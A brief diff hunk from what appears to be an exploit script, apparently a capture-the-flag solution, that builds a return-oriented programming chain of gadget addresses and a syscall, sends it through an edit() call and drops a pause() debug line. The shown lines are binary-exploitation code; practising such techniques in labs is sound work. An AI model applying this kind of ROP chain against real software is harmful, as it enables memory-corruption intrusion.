@@ -151,7 +151,6 @@ rop += p64(stack_addr) + p64(pop_rdi) + p64(3) + p64(pop_rdx)
 rop += p64(0x20) + p64(syscall_addr) + p64(ret_addr)
 
 edit(rop)
-pause()
 rl()
 
 
